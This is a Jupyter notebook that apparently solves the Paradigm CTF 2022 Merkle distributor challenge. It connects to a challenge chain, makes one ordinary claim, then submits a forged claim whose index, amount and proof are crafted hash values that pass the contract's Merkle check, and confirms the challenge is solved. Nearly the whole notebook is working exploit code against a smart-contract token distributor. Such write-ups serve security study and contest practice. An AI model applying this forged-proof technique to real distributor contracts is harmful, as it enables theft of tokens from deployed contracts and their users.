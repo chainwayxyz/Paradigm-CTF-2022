{
 "cells": [
  {
   "cell_type": "code",
   "execution_count": 1,
   "metadata": {},
   "outputs": [],
   "source": [
    "from web3 import Web3\n",
    "import json\n",
    "from eth_account import Account\n",
    "\n",
    "\n",
    "web3 = Web3(Web3.HTTPProvider(\"\"))\n",
    "\n",
    "\n",
    "\n",
    "\n",
    "private_key = \"\"\n",
    "\n",
    "\n",
    "ACC_ADDRESS = Account.from_key(private_key).address\n",
    "\n",
    "SETUP_ADDR = \"\"\n",
    "setup_contract = web3.eth.contract(\n",
    "        address=Web3.toChecksumAddress(SETUP_ADDR), abi=json.load(open(\"setup.json\", \"r\"))\n",
    "    )"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 2,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "0xfaF64f7718b3CdcFd2C90e6811608656b9B25737\n"
     ]
    }
   ],
   "source": [
    "DISTRIBUTOR_ADDR = setup_contract.functions.merkleDistributor().call()\n",
    "print(DISTRIBUTOR_ADDR)\n",
    "distributor_contract = web3.eth.contract(address=DISTRIBUTOR_ADDR, abi=json.load(open(\"distributor.json\", \"r\")))"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 3,
   "metadata": {},
   "outputs": [],
   "source": [
    "tree = json.load(open(\"../tree.json\", \"r\"))\n"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 4,
   "metadata": {},
   "outputs": [],
   "source": [
    "def send_claim_tx(index, account, amount, merkle_proof):\n",
    "    nonce = web3.eth.get_transaction_count(ACC_ADDRESS)\n",
    "    print(\"Sending index:\", index,\"Nonce:\", nonce)\n",
    "\n",
    "    transaction = distributor_contract.functions.claim(index, account, amount, merkle_proof).buildTransaction({\n",
    "        \"value\": 0,\n",
    "        'nonce': nonce,\n",
    "        'maxFeePerGas': 0,\n",
    "        'maxPriorityFeePerGas': 0,\n",
    "        'from': ACC_ADDRESS\n",
    "    }\n",
    "    )\n",
    "\n",
    "    signed_transaction = web3.eth.account.sign_transaction(\n",
    "        transaction, private_key=private_key)\n",
    "\n",
    "    res = web3.eth.send_raw_transaction(signed_transaction.rawTransaction)\n",
    "\n",
    "    receipt = web3.eth.wait_for_transaction_receipt(res)\n"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 5,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Sending index: 8 Nonce: 0\n"
     ]
    }
   ],
   "source": [
    "special_amount = 0\n",
    "for acc, info in tree[\"claims\"].items():\n",
    "    if info[\"index\"] == 8:\n",
    "        send_claim_tx(info[\"index\"], acc, int(info[\"amount\"], 16), info[\"proof\"])"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 7,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Sending index: 95977926008167990775258181520762344592149243674153847852637091833889008632898 Nonce: 1\n"
     ]
    }
   ],
   "source": [
    "send_claim_tx(int(\"0xd43194becc149ad7bf6db88a0ae8a6622e369b3367ba2cc97ba1ea28c407c442\", 16),\n",
    "              web3.toChecksumAddress(\"0xd48451c19959e2d9bd4e620fbe88aa5f6f7ea72a\"), int(\"0x00000f40f0c122ae08d2207b\", 16), [\n",
    "    \"0x8920c10a5317ecff2d0de2150d5d18f01cb53a377f4c29a9656785a22a680d1d\",\n",
    "    \"0xc999b0a9763c737361256ccc81801b6f759e725e115e4a10aa07e63d27033fde\",\n",
    "    \"0x842f0da95edb7b8dca299f71c33d4e4ecbb37c2301220f6e17eef76c5f386813\",\n",
    "    \"0x0e3089bffdef8d325761bd4711d7c59b18553f14d84116aecb9098bba3c0a20c\",\n",
    "    \"0x5271d2d8f9a3cc8d6fd02bfb11720e1c518a3bb08e7110d6bf7558764a8da1c5\"\n",
    "])\n"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 8,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "True\n"
     ]
    }
   ],
   "source": [
    "print(setup_contract.functions.isSolved().call())"
   ]
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "Python 3.9.0 64-bit ('bilira-venv')",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.9.0"
  },
  "orig_nbformat": 4,
  "vscode": {
   "interpreter": {
    "hash": "571170744dfc1bbcd7e1bbeadd11b3f61442130db791a2abe03fbbff02b71dac"
   }
  }
 },
 "nbformat": 4,
 "nbformat_minor": 2
}
